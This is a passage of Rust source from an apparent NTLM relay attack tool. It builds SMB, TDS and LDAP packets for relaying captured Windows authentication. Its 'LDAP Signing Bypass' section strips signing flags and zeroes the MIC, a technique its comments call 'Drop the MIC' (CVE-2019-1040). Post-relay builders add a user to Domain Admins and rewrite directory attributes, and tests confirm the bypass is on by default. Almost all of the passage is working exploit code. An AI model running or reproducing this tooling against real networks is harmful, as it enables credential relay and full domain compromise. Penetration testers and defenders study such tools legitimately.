    msg.extend_from_slice(&0u32.to_le_bytes()); // ClientProgVer
    msg.extend_from_slice(&std::process::id().to_le_bytes()); // ClientPID
    msg.extend_from_slice(&0u32.to_le_bytes()); // ConnectionID
    // OptionFlags1: USE_DB_ON | INIT_DB_FATAL | SET_LANG_ON
    msg.push(0xE0);
    // OptionFlags2: INIT_LANG_FATAL | ODBC_ON | USER_NORMAL | INTEGRATED_SECURITY_ON
    msg.push(0x03);
    // TypeFlags: SQL_DFLT
    msg.push(0x00);
    // OptionFlags3
    msg.push(0x00);
    msg.extend_from_slice(&0i32.to_le_bytes()); // ClientTimeZone
    msg.extend_from_slice(&0x00000409u32.to_le_bytes()); // ClientLCID (en-US)

    // â”€â”€ Offset/Length pairs (each is offset:u16, length:u16) â”€â”€
    // Variable data starts after the 94-byte fixed portion.
    // Offset is from the start of the LOGIN7 data (not TDS header).
    let var_data_offset: u16 = 94;

    // All string fields point to offset var_data_offset with length 0 (empty)
    // ibHostName, cchHostName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibUserName, cchUserName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibPassword, cchPassword
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibAppName, cchAppName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibServerName, cchServerName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibExtension (unused, 0)
    msg.extend_from_slice(&0u16.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibCltIntName, cchCltIntName
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibLanguage, cchLanguage
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());
    // ibDatabase, cchDatabase
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());

    // ClientID (6 bytes MAC address â€” zeroed)
    msg.extend_from_slice(&[0u8; 6]);

    // ibSSPI, cbSSPI â€” THIS IS THE KEY FIELD
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    let sspi_len = ntlm_data.len() as u16;
    msg.extend_from_slice(&sspi_len.to_le_bytes());

    // ibAtchDBFile, cchAtchDBFile
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());

    // ibChangePassword, cchChangePassword
    msg.extend_from_slice(&var_data_offset.to_le_bytes());
    msg.extend_from_slice(&0u16.to_le_bytes());

    // cbSSPILong (u32) â€” for SSPI > 65535 bytes
    msg.extend_from_slice(&(ntlm_data.len() as u32).to_le_bytes());

    // Pad to 94 bytes if needed
    while msg.len() - login_start < 94 {
        msg.push(0);
    }

    // â”€â”€ Variable data: SSPI blob â”€â”€
    msg.extend_from_slice(ntlm_data);

    // Patch LOGIN7 total length
    let login_len = (msg.len() - login_start) as u32;
    msg[login_start..login_start + 4].copy_from_slice(&login_len.to_le_bytes());

    // Patch TDS packet length
    let tds_len = msg.len() as u16;
    msg[2..4].copy_from_slice(&tds_len.to_be_bytes());

    msg
}

/// Build TDS SSPI continuation packet (type 0x11)
fn build_tds_sspi_message(ntlm_data: &[u8]) -> Vec<u8> {
    let tds_len = (8 + ntlm_data.len()) as u16;
    let mut msg = Vec::with_capacity(tds_len as usize);

    msg.push(0x11); // Type: TDS7_AUTH (SSPI)
    msg.push(0x01); // Status: EOM
    msg.extend_from_slice(&tds_len.to_be_bytes()); // Length
    msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
    msg.push(0x02); // PacketID
    msg.push(0x00); // Window

    msg.extend_from_slice(ntlm_data);
    msg
}

/// Extract NTLM challenge from TDS response
fn extract_ntlm_from_tds(data: &[u8]) -> Result<Vec<u8>> {
    // Scan for NTLMSSP signature
    for i in 0..data.len().saturating_sub(12) {
        if &data[i..i + 8] == NTLM_SIGNATURE
            && let Some(NtlmMessageType::Challenge) = parse_ntlm_type(&data[i..])
        {
            let end = find_ntlm_challenge_end(&data[i..]);
            return Ok(data[i..i + end].to_vec());
        }
    }
    Err(RelayError::Protocol("No NTLM challenge in TDS response".into()).into())
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Utility Functions
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Parse username/domain from NTLM AUTHENTICATE message
pub fn parse_ntlm_authenticate_info(data: &[u8]) -> Result<(String, String)> {
    if data.len() < 64 {
        return Err(RelayError::Protocol("NTLM authenticate too short".into()).into());
    }

    if &data[0..8] != NTLM_SIGNATURE {
        return Err(RelayError::Protocol("Invalid NTLM signature".into()).into());
    }

    if parse_ntlm_type(data) != Some(NtlmMessageType::Authenticate) {
        return Err(RelayError::Protocol("Not an AUTHENTICATE message".into()).into());
    }

    fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
        if offset + 8 > data.len() {
            return None;
        }
        let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
        let buffer_offset = u32::from_le_bytes([
            data[offset + 4],
            data[offset + 5],
            data[offset + 6],
            data[offset + 7],
        ]) as usize;

        if len == 0 {
            return Some(Vec::new());
        }
        if buffer_offset + len <= data.len() {
            Some(data[buffer_offset..buffer_offset + len].to_vec())
        } else {
            None
        }
    }

    let domain_bytes = extract_field(data, 28).unwrap_or_default();
    let username_bytes = extract_field(data, 36).unwrap_or_default();

    let domain = decode_utf16le(&domain_bytes);
    let username = decode_utf16le(&username_bytes);

    Ok((username, domain))
}

/// Decode UTF-16LE bytes to String
fn decode_utf16le(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }
    let chars: Vec<u16> = data
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();
    String::from_utf16_lossy(&chars)
}

/// Base64 encode
fn base64_encode(data: &[u8]) -> String {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.encode(data)
}

/// Base64 decode
fn base64_decode(data: &str) -> Option<Vec<u8>> {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.decode(data.trim()).ok()
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LDAP Signing Bypass â€” Challenge & Authenticate Modification
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Strip NTLMSSP_NEGOTIATE_SIGN / SEAL / ALWAYS_SIGN from an NTLM
/// CHALLENGE message **before** the victim sees it.
/// If the victim never learns the server wants signing, it will not
/// compute a MIC and will not set SIGN flags in its AUTHENTICATE.
/// This is the first half of the "Drop the MIC" technique (CVE-2019-1040).
fn strip_signing_flags_from_challenge(challenge: &mut [u8]) {
    // NegotiateFlags live at offset 20 in a Type 2 (CHALLENGE) message.
    if challenge.len() < 24 {
        return;
    }
    if &challenge[0..8] != NTLM_SIGNATURE {
        return;
    }
    let msg_type = u32::from_le_bytes([challenge[8], challenge[9], challenge[10], challenge[11]]);
    if msg_type != 2 {
        return;
    }
    let mut flags =
        u32::from_le_bytes([challenge[20], challenge[21], challenge[22], challenge[23]]);
    flags &= !(NTLMSSP_NEGOTIATE_SIGN | NTLMSSP_NEGOTIATE_SEAL | NTLMSSP_NEGOTIATE_ALWAYS_SIGN);
    challenge[20..24].copy_from_slice(&flags.to_le_bytes());
}

/// Prepare an NTLM AUTHENTICATE message for LDAP relay.
/// Belt-and-suspenders companion to `strip_signing_flags_from_challenge`:
///   1. Clear SIGN / SEAL / ALWAYS_SIGN from NegotiateFlags (offset 60).
///   2. Zero the MIC field (16 bytes at offset 72) if it looks present.
///
/// The NtProofStr covers `ServerChallenge â€– ClientBlob` â€” NOT the outer
/// AUTHENTICATE header â€” so flag/MIC changes don't break the hash chain
/// that the server verifies.
fn prepare_authenticate_for_ldap_relay(authenticate: &[u8]) -> Vec<u8> {
    let mut msg = authenticate.to_vec();

    if msg.len() < 64 {
        return msg;
    }
    if &msg[0..8] != NTLM_SIGNATURE {
        return msg;
    }
    let msg_type = u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]);
    if msg_type != 3 {
        return msg;
    }

    // Step 1 â€” clear signing negotiate flags (offset 60..64)
    let mut flags = u32::from_le_bytes([msg[60], msg[61], msg[62], msg[63]]);
    flags &= !(NTLMSSP_NEGOTIATE_SIGN | NTLMSSP_NEGOTIATE_SEAL | NTLMSSP_NEGOTIATE_ALWAYS_SIGN);
    msg[60..64].copy_from_slice(&flags.to_le_bytes());

    // Step 2 â€” zero the MIC (bytes 72..88).
    // MIC exists when the message is long enough to contain it (â‰¥88 bytes).
    // Because we also stripped SIGN from the CHALLENGE the victim saw, the
    // victim most likely didn't produce a MIC. But zeroing is harmless and
    // covers edge cases where the victim computed one anyway.
    if msg.len() >= 88 {
        msg[72..88].fill(0);
    }

    msg
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Post-Relay LDAP Operation Builders
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

/// Build an LDAP Modify request to add a `member` value to a group.
/// BER layout:
/// ```text
/// SEQUENCE {
///   INTEGER messageId
///   APPLICATION 6 (ModifyRequest) {
///     OCTET STRING groupDN
///     SEQUENCE OF {
///       SEQUENCE {
///         ENUMERATED 0 (add)
///         PARTIAL-ATTRIBUTE {
///           OCTET STRING "member"
///           SET { OCTET STRING userDN }
///         }
///       }
///     }
///   }
/// }
/// ```
fn build_ldap_modify_add_member(group_dn: &str, user_dn: &str, message_id: u32) -> Vec<u8> {
    // innermost: SET { OCTET STRING userDN }
    let val = ber_octet_string(user_dn.as_bytes());
    let val_set = ber_wrap(0x31, &val);
    // attribute type + set
    let attr_type = ber_octet_string(b"member");
    let partial_attr = [attr_type, val_set].concat();
    let partial_seq = ber_wrap(0x30, &partial_attr);
    // operation (ENUMERATED 0 = add)
    let op = ber_wrap(0x0A, &[0x00]);
    let mod_item = ber_wrap(0x30, &[op, partial_seq].concat());
    let mods = ber_wrap(0x30, &mod_item);
    // ModifyRequest body
    let object = ber_octet_string(group_dn.as_bytes());
    let modify_body = [object, mods].concat();
    let modify_req = ber_wrap(0x66, &modify_body);
    // top-level LDAP message
    let msgid = ber_integer(message_id as i64);
    ber_wrap(0x30, &[msgid, modify_req].concat())
}

/// Build an LDAP Modify request with a **replace** operation.
fn build_ldap_modify_replace(
    dn: &str,
    attribute: &str,
    values: &[&str],
    message_id: u32,
) -> Vec<u8> {
    let mut vals = Vec::new();
    for v in values {
        vals.extend_from_slice(&ber_octet_string(v.as_bytes()));
    }
    let val_set = ber_wrap(0x31, &vals);
    let attr_type = ber_octet_string(attribute.as_bytes());
    let partial_attr = [attr_type, val_set].concat();
    let partial_seq = ber_wrap(0x30, &partial_attr);
    // ENUMERATED 2 = replace
    let op = ber_wrap(0x0A, &[0x02]);
    let mod_item = ber_wrap(0x30, &[op, partial_seq].concat());
    let mods = ber_wrap(0x30, &mod_item);
    let object = ber_octet_string(dn.as_bytes());
    let modify_body = [object, mods].concat();
    let modify_req = ber_wrap(0x66, &modify_body);
    let msgid = ber_integer(message_id as i64);
    ber_wrap(0x30, &[msgid, modify_req].concat())
}

/// Build a subtree LDAP SearchRequest with a bare `(objectClass=*)` style
/// filter or a simple equality filter `(attr=value)`.
fn build_ldap_search_request(
    base_dn: &str,
    filter: &str,
    attrs: &[&str],
    message_id: u32,
) -> Vec<u8> {
    let base = ber_octet_string(base_dn.as_bytes());
    // scope: wholeSubtree (2)
    let scope = ber_wrap(0x0A, &[0x02]);
    // derefAliases: neverDerefAliases (0)
    let deref = ber_wrap(0x0A, &[0x00]);
    // sizeLimit 1000
    let size_limit = ber_integer(1000);
    // timeLimit 30
    let time_limit = ber_integer(30);
    // typesOnly false
    let types_only = ber_wrap(0x01, &[0x00]);

    // Filter â€” parse simple (attr=value) or fall back to present(objectClass)
    let filter_ber = if let Some(inner) = filter.strip_prefix('(').and_then(|s| s.strip_suffix(')'))
    {
        if let Some((attr, val)) = inner.split_once('=') {
            if val == "*" {
                // present filter: context tag [7] OCTET STRING
                ber_wrap(0x87, attr.as_bytes())
            } else {
                // equality filter: context tag [3] SEQUENCE { attr, val }
                let a = ber_octet_string(attr.as_bytes());
                let v = ber_octet_string(val.as_bytes());
                ber_wrap(0xA3, &[a, v].concat())
            }
        } else {
            ber_wrap(0x87, b"objectClass")
        }
    } else {
        ber_wrap(0x87, b"objectClass")
    };

    // attributes
    let mut attr_list = Vec::new();
    for a in attrs {
        attr_list.extend_from_slice(&ber_octet_string(a.as_bytes()));
    }
    let attr_seq = ber_wrap(0x30, &attr_list);

    let search_body = [
        base, scope, deref, size_limit, time_limit, types_only, filter_ber, attr_seq,
    ]
    .concat();
    let search_req = ber_wrap(0x63, &search_body);
    let msgid = ber_integer(message_id as i64);
    ber_wrap(0x30, &[msgid, search_req].concat())
}

/// Parse a generic LDAP result (BindResponse, ModifyResponse, etc.)
/// by scanning for the given APPLICATION tag and extracting the
/// ENUMERATED resultCode.
fn parse_ldap_generic_result(data: &[u8], app_tag: u8) -> Result<u8> {
    for i in 0..data.len().saturating_sub(4) {
        if data[i] == app_tag {
            let (inner_start, _inner_len) = match ber_read_length(data, i + 1) {
                Some(v) => v,
                None => continue,
            };
            if inner_start < data.len() && data[inner_start] == 0x0A {
                let (val_start, val_len) = match ber_read_length(data, inner_start + 1) {
                    Some(v) => v,
                    None => continue,
                };
                if val_len > 0 && val_start < data.len() {
                    return Ok(data[val_start]);
                }
            }
        }
    }
    Err(RelayError::Protocol(format!(
        "Cannot parse LDAP result for tag 0x{:02X}",
        app_tag
    ))
    .into())
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Tests
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};

    #[test]
    fn test_relay_config() {
        let target = RelayTarget {
            address: SocketAddr::new(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 10)), 445),
            protocol: Protocol::Smb,
            username: None,
        };

        let config = RelayConfig {
            listen_ip: "0.0.0.0".to_string(),
            targets: vec![target],
            round_robin: true,
            remove_on_success: true,
            timeout_secs: 30,
            ldap_signing_bypass: true,
            max_retries: 3,
            max_connections: 64,
        };

        assert_eq!(config.listen_ip, "0.0.0.0");
        assert_eq!(config.targets.len(), 1);
    }

    #[tokio::test]
    async fn test_relay_lifecycle() {
        let config = RelayConfig::default();
        let mut relay = NtlmRelay::new(config);
        assert!(!relay.is_running());

        relay.start().await.unwrap();
        assert!(relay.is_running());

        relay.stop().await.unwrap();
        assert!(!relay.is_running());
    }

    #[test]
    fn test_relay_stats_default() {
        let stats = RelayStats::default();
        assert_eq!(stats.successful_relays.load(Ordering::Relaxed), 0);
        assert_eq!(stats.failed_relays.load(Ordering::Relaxed), 0);
        assert_eq!(stats.active_connections.load(Ordering::Relaxed), 0);
        assert_eq!(stats.total_attempts.load(Ordering::Relaxed), 0);
        assert!(
            stats
                .stats_by_protocol
                .read()
                .map(|g| g.is_empty())
                .unwrap_or(true)
        );
    }

    #[test]
    fn test_ntlm_type_parsing() {
        let negotiate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x01, 0x00, 0x00, 0x00,
        ];
        assert_eq!(
            parse_ntlm_type(&negotiate),
            Some(NtlmMessageType::Negotiate)
        );

        let challenge = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x02, 0x00, 0x00, 0x00,
        ];
        assert_eq!(
            parse_ntlm_type(&challenge),
            Some(NtlmMessageType::Challenge)
        );

        let authenticate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00,
        ];
        assert_eq!(
            parse_ntlm_type(&authenticate),
            Some(NtlmMessageType::Authenticate)
        );
    }

    #[test]
    fn test_decode_utf16le() {
        let data = [0x74, 0x00, 0x65, 0x00, 0x73, 0x00, 0x74, 0x00];
        let result = decode_utf16le(&data);
        assert_eq!(result, "test");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"Hello, World!";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }

    #[test]
    fn test_smb2_negotiate_structure() {
        let pdu = build_smb2_negotiate(0);
        // NetBIOS(4) + SMB2 header(64) + body(36+6 dialects)
        assert!(pdu.len() >= 68 + 36 + 6);
        // Check magic
        assert_eq!(&pdu[4..8], b"\xfeSMB");
        // Check command = NEGOTIATE (0x0000)
        assert_eq!(&pdu[16..18], &0x0000u16.to_le_bytes());
    }

    #[test]
    fn test_smb2_session_setup_structure() {
        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00test";
        let pdu = build_smb2_session_setup(ntlm, 0x1234, 1);
        // Check magic
        assert_eq!(&pdu[4..8], b"\xfeSMB");
        // Check command = SESSION_SETUP (0x0001)
        assert_eq!(&pdu[16..18], &0x0001u16.to_le_bytes());
        // Check session ID at absolute offset 44..52 (netbios=4 + smb2_field_offset=40)
        let sid = u64::from_le_bytes([
            pdu[44], pdu[45], pdu[46], pdu[47], pdu[48], pdu[49], pdu[50], pdu[51],
        ]);
        assert_eq!(sid, 0x1234);
    }

    #[test]
    fn test_ber_encode_length() {
        assert_eq!(ber_encode_length(5), vec![5]);
        assert_eq!(ber_encode_length(127), vec![127]);
        assert_eq!(ber_encode_length(128), vec![0x81, 128]);
        assert_eq!(ber_encode_length(300), vec![0x82, 0x01, 0x2C]);
    }

    #[test]
    fn test_ldap_sasl_bind_is_valid_ber() {
        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00testdata1234567890";
        let bind = build_ldap_sasl_bind(ntlm, 1);
        // Must start with SEQUENCE tag
        assert_eq!(bind[0], 0x30);
        // Must contain "GSS-SPNEGO"
        let contains_mechanism = bind.windows(10).any(|w| w == b"GSS-SPNEGO");
        assert!(contains_mechanism);
    }

    #[test]
    fn test_tds_prelogin_header() {
        let pdu = build_tds_prelogin();
        assert_eq!(pdu[0], 0x12); // PRELOGIN
        assert_eq!(pdu[1], 0x01); // EOM
        let len = u16::from_be_bytes([pdu[2], pdu[3]]);
        assert_eq!(len as usize, pdu.len());
    }

    #[test]
    fn test_tds_login7_sspi() {
        let ntlm = b"NTLMSSP\x00\x01\x00\x00\x00";
        let pdu = build_tds_login7_sspi(ntlm);
        assert_eq!(pdu[0], 0x10); // LOGIN7
        let tds_len = u16::from_be_bytes([pdu[2], pdu[3]]);
        assert_eq!(tds_len as usize, pdu.len());
        // SSPI data should be at the end
        let end = &pdu[pdu.len() - ntlm.len()..];
        assert_eq!(end, ntlm);
    }

    // â”€â”€ LDAP signing bypass tests â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    #[test]
    fn test_strip_signing_flags_from_challenge() {
        // Build a minimal Type 2 (CHALLENGE) message with SIGN+SEAL+ALWAYS_SIGN set
        let mut challenge = Vec::new();
        challenge.extend_from_slice(b"NTLMSSP\x00"); // signature
        challenge.extend_from_slice(&2u32.to_le_bytes()); // msg type 2
        challenge.extend_from_slice(&[0u8; 8]); // target name fields (offset 12..20)
        // flags at offset 20: SIGN(0x10) | SEAL(0x20) | ALWAYS_SIGN(0x8000) | NTLM(0x200)
        let flags: u32 = 0x0000_8230;
        challenge.extend_from_slice(&flags.to_le_bytes());
        challenge.extend_from_slice(&[0u8; 8]); // server challenge

        strip_signing_flags_from_challenge(&mut challenge);

        let patched =
            u32::from_le_bytes([challenge[20], challenge[21], challenge[22], challenge[23]]);
        assert_eq!(
            patched & NTLMSSP_NEGOTIATE_SIGN,
            0,
            "SIGN should be stripped"
        );
        assert_eq!(
            patched & NTLMSSP_NEGOTIATE_SEAL,
            0,
            "SEAL should be stripped"
        );
        assert_eq!(
            patched & NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
            0,
            "ALWAYS_SIGN should be stripped"
        );
        // NTLM flag (0x200) should survive
        assert_ne!(patched & 0x0200, 0);
    }

    #[test]
    fn test_strip_signing_flags_short_message() {
        let mut short = vec![0u8; 10];
        // Should not panic on short messages
        strip_signing_flags_from_challenge(&mut short);
    }

    #[test]
    fn test_prepare_authenticate_strips_flags_and_mic() {
        // Build a minimal Type 3 (AUTHENTICATE) message
        let mut auth = vec![0u8; 96];
        auth[0..8].copy_from_slice(b"NTLMSSP\x00");
        auth[8..12].copy_from_slice(&3u32.to_le_bytes());
        // flags at offset 60: SIGN | SEAL | ALWAYS_SIGN | NTLM
        let flags: u32 = NTLMSSP_NEGOTIATE_SIGN
            | NTLMSSP_NEGOTIATE_SEAL
            | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            | 0x0200;
        auth[60..64].copy_from_slice(&flags.to_le_bytes());
        // Fake MIC at bytes 72..88
        auth[72..88].fill(0xAA);

        let patched = prepare_authenticate_for_ldap_relay(&auth);

        let new_flags = u32::from_le_bytes([patched[60], patched[61], patched[62], patched[63]]);
        assert_eq!(new_flags & NTLMSSP_NEGOTIATE_SIGN, 0);
        assert_eq!(new_flags & NTLMSSP_NEGOTIATE_SEAL, 0);
        assert_eq!(new_flags & NTLMSSP_NEGOTIATE_ALWAYS_SIGN, 0);
        assert_ne!(new_flags & 0x0200, 0, "NTLM flag must survive");

        // MIC should be zeroed
        assert!(
            patched[72..88].iter().all(|&b| b == 0),
            "MIC must be zeroed"
        );
    }

    #[test]
    fn test_prepare_authenticate_short_message() {
        let short = b"NTLMSSP\x00\x03\x00\x00\x00".to_vec();
        // Should return as-is without panicking (< 64 bytes)
        let result = prepare_authenticate_for_ldap_relay(&short);
        assert_eq!(result.len(), short.len());
    }

    #[test]
    fn test_ldap_modify_add_member_valid_ber() {
        let pdu = build_ldap_modify_add_member(
            "CN=Domain Admins,CN=Users,DC=lab,DC=local",
            "CN=testuser,CN=Users,DC=lab,DC=local",
            3,
        );
        // Must start with SEQUENCE
        assert_eq!(pdu[0], 0x30);
        // Must contain "member"
        assert!(pdu.windows(6).any(|w| w == b"member"));
        // Must contain both DNs
        assert!(pdu.windows(12).any(|w| w == b"Domain Admin"));
    }

    #[test]
    fn test_ldap_search_request_valid_ber() {
        let pdu = build_ldap_search_request(
            "DC=lab,DC=local",
            "(objectClass=*)",
            &["dn", "sAMAccountName"],
            4,
        );
        assert_eq!(pdu[0], 0x30);
        // Must contain base DN
        assert!(pdu.windows(3).any(|w| w == b"lab"));
    }

    #[test]
    fn test_relay_config_default() {
        let cfg = RelayConfig::default();
        assert!(
            cfg.ldap_signing_bypass,
            "LDAP signing bypass should default to true"
        );
        assert_eq!(cfg.max_retries, 3);
        assert!(cfg.max_connections >= 1);
    }
}
